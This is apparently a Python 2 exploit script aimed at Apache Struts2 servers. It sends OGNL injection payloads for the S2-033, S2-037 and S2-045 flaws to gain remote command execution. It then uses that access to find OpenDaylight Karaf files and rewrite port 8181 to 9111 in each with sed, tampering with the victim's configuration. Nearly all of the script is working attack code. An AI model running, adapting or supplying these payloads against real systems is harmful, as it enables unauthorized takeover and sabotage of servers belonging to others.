#!/usr/bin/env python
# coding=utf-8

#sed -i s/9111/8181/g `grep -rl 9111 ./*`

import re
import sys
import socket
import base64
import httplib
import warnings
import requests
from termcolor import cprint
from urlparse import urlparse
warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

#超时设置
TMOUT=10

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
}
class struts_baseverify:
    def __init__(self, url):
        self.url = url
        self.poc = {
                "ST2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=netstat -an''',
                "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
                }
        self.shell = {
                 "struts2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=FUZZINGCOMMAND''',
		"struts2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=FUZZINGCOMMAND''',
                }


    def inShell(self, pocname):
        cprint("-------struts2 漏洞利用--------\n目标url:"+self.url)
        path = ""
	text = ""
	list1 = range(20)
        if pocname == "struts2-033":
            command = "find / -name *karaf-0.6.0-Carbon"
            try:
                commurl = self.url+self.shell['struts2-033'].replace("FUZZINGCOMMAND", command)
                req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                path=req.text
            except:
                cprint("failed!")
            command = "grep -rl 8181 "+path
            try:
                commurl = self.url+self.shell['struts2-033'].replace("FUZZINGCOMMAND", command)
                req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
		text = req.text
                list1 = text.splitlines()
		for i in range(len(list1)): 
		    command = "sed -i s/8181/9111/g "+list1[i]
                    try:
                        commurl = self.url+self.shell['struts2-033'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
		    except:
			cprint("failed")
		
                cprint ("9111 is Ok!")
            except:
                cprint("failed!")   

        if pocname == "struts2-037":
	    command = "find / -name *karaf-0.6.0-Carbon"
	    try:
                commurl = self.url+self.shell['struts2-037'].replace("FUZZINGCOMMAND", command)
                req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                path=req.text
            except:
                cprint("failed!")
            command = "grep -rl 8181 "+path
	    command = command.strip()
            try:
                commurl = self.url+self.shell['struts2-037'].replace("FUZZINGCOMMAND", command)
                req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                text = req.text
                list1 = text.splitlines()
                for i in range(len(list1)):
                    command = "sed -i s/8181/9111/g "+list1[i]
                    try:
                        commurl = self.url+self.shell['struts2-037'].replace("FUZZINGCOMMAND", command)
                        req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                    except:
                        cprint("failed")

                cprint ("9111 is Ok!")
            except:
                cprint("failed!")


        if pocname == "struts2-045":
	    command = "find / -name *karaf-0.6.0-Carbon"
	    headers_exp = {
                         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                         "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                         "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                         }
            try:
                req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                path=req.text
            except:
                cprint("failed1!")
 
	    command = "grep -rl 8181 "+path
	    command = command.strip()
	    headers_exp = {
                         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                         "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                         "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                         }
            try:
		req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                text = req.text
                list1 = text.splitlines()
                for i in range(len(list1)):
                    command = "sed -i s/8181/9111/g "+list1[i]
                    headers_exp = {
                         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                         "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                         "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                         }
                    try:
			req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                    except:
                        cprint("failed2")

                cprint ("9111 is Ok!")
            except:
                cprint("failed3!")


if __name__ == "__main__":
    try:
        if sys.argv[1] == "-u":
            strutsVuln = struts_baseverify(sys.argv[2].strip())
            strutsVuln.inShell(sys.argv[4].strip())
        else:
            strutsVuln = struts_baseverify(sys.argv[1].strip())
    except Exception as e:
        print "Usage: python struts-down1.py -u http://example.com/index.action -i struts2-033 指定漏洞利用"
